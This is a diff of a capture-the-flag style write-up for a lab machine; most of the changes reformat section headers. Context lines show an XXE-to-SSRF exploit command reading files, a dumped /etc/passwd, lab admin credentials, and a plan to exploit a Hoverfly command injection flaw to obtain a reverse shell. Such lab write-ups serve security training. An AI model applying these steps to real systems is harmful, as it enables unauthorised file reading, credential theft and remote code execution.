@@ -26,7 +26,7 @@ Machine Overview
     Difficulty: Medium
 
 
-### **1\. Reconnaissance**
+ **1. Reconnaissance**
 ================================
 
 The first step is always reconnaissance. I started with a full Nmap scan to map out the attack surface:
@@ -71,7 +71,7 @@ To understand the backend logic, I used jadx-gui to decompile the retrieved JAR 
 ![captionless image](./page6.png)
 
 
-### **2\. Vulnerability Research & Intelligence**
+ **2. Vulnerability Research & Intelligence**
 ==================================================
 
 After identifying the tech stack through static analysis of the employee-service.jar, I shifted my focus to finding a viable entry point. Running an outdated stack like **Jetty 9.4.27** combined with **Apache CXF** is a massive red flag in any security audit.
@@ -94,7 +94,7 @@ To weaponize this, I utilized a specialized Python exploit script:
 *   **Exploit Source:** [CVE-2022-46364-Poc by kasem545](https://github.com/kasem545/CVE-2022-46364-Poc/tree/main)
     
 
-### **3\. Exploitation: Weaponizing the XXE**
+**3. Exploitation: Weaponizing the XXE**
 ================================================
 
 I used the identified PoC to confirm the **XXE-to-SSRF** flaw. My primary objective was to confirm the vulnerability and map out the system users to find a path for lateral movement.
@@ -112,7 +112,7 @@ I used the identified PoC to confirm the **XXE-to-SSRF** flaw. My primary object
 EXFILTRATED CONTENT  ======================================================================  root:x:0:0:root:/root:/bin/bash  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  bin:x:2:2:bin:/bin:/usr/sbin/nologin  sys:x:3:3:sys:/dev:/usr/sbin/nologin  sync:x:4:65534:sync:/bin:/bin/sync  games:x:5:60:games:/usr/games:/usr/sbin/nologin  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  _apt:x:42:65534::/nonexistent:/usr/sbin/nologin  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin  systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin  messagebus:x:101:102::/nonexistent:/usr/sbin/nologin  systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin  pollinate:x:102:1::/var/cache/pollinate:/bin/false  polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin  syslog:x:103:104::/nonexistent:/usr/sbin/nologin  uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin  tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin  tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false  landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin  fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin  usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin  sshd:x:109:65534::/run/sshd:/usr/sbin/nologin  dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash  ftp:x:110:111:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin  syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin  postfix:x:111:112::/var/spool/postfix:/usr/sbin/nologin  _laurel:x:999:987::/var/log/laurel:/bin/false  dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false  ======================================================================  [✓] EXPLOIT SUCCESSFUL  Server fetched internal resource and returned contents.  nano
 ``` 
 
-### **4\. Pivoting: From XXE to Hoverfly Credentials**
+ **4. Pivoting: From XXE to Hoverfly Credentials**
 ========================================================
 With the **XXE** vulnerability confirmed, my next objective was to find administrative credentials for the **Hoverfly Dashboard** running on port **8888**. In a real-world scenario, once you have **Arbitrary File Read**, you don't just guess files—you look for **Service Configurations** to find hardcoded secrets.
 
@@ -154,7 +154,7 @@ nano ~/Desktop ❯ python3 CVE-2022-46364.py \\         -t  \\    -s file:///etc
 
     
 
-### **5\. Vulnerability Research: Hoverfly RCE**
+**5. Vulnerability Research: Hoverfly RCE**
 =================================================
 
 Having secured the credentials, I researched potential vulnerabilities for the Hoverfly instance. My investigation led to **CVE-2025-54123**, a critical **Command Injection** flaw.
@@ -172,7 +172,7 @@ Having secured the credentials, I researched potential vulnerabilities for the H
 
 **The Strategy**: Use the discovered admin:O7IJ27MyyXiU credentials to authenticate and exploit the middleware API to trigger a reverse shell as the dev\_ryan user.
 
-### **6\. Initial Access: Hoverfly RCE**
+**6. Initial Access: Hoverfly RCE**
 =========================================
 
 With the administrative credentials admin:O7IJ27MyyXiU in hand, I moved to exploit the **Hoverfly Middleware Command Injection** vulnerability. As identified in the research phase, this flaw allows for direct command execution through the middleware API.
@@ -236,8 +236,7 @@ CTRL Z
 
  **7. Privilege Escalation**
 =================================
-8.**Exploitation Flow Summary**
-===============================
+
 
 After securing a foothold as **dev\_ryan**, I began my internal enumeration. Checking sudo permissions revealed an interesting entry:
 ```
